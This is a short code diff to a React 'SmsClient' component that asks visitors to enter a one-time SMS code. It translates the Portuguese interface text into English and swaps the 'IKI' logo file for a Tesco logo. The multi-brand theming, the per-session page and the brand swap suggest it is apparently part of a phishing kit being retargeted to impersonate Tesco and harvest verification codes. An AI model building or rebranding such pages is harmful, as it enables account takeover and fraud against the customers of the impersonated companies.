@@ -134,7 +134,7 @@ export function SmsClient({ sessionId }: Props) {
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
         <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8 text-center">
           <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
-            Ligação inválida.
+            Invalid link.
           </p>
         </div>
       </div>
@@ -196,7 +196,7 @@ export function SmsClient({ sessionId }: Props) {
         {/* Right Top Logo Placeholder */}
         <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
           <img
-            src="/form-assets/iki-mini-logo.png"
+            src="/form-assets/tesco-mini-logo.png"
             alt="IKI logo"
             className="h-10 w-10 object-contain drop-shadow-[0_10px_18px_rgba(0,0,0,0.35)]"
             id="sms-ah-logo"
@@ -245,7 +245,7 @@ export function SmsClient({ sessionId }: Props) {
           </div>
 
           {!valid && code.length > 0 ? (
-            <p className="text-xs text-red-400">Introduza exatamente {digits} dígitos.</p>
+            <p className="text-xs text-red-400">Enter exactly {digits} digits.</p>
           ) : null}
 
           {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}
@@ -259,7 +259,7 @@ export function SmsClient({ sessionId }: Props) {
           </button>
 
           <p className="text-center text-xs text-gray-400 mt-4">
-            O código foi enviado por SMS para o seu número de telemóvel.
+            The code has been sent by SMS to your mobile number.
           </p>
         </form>
       </div>
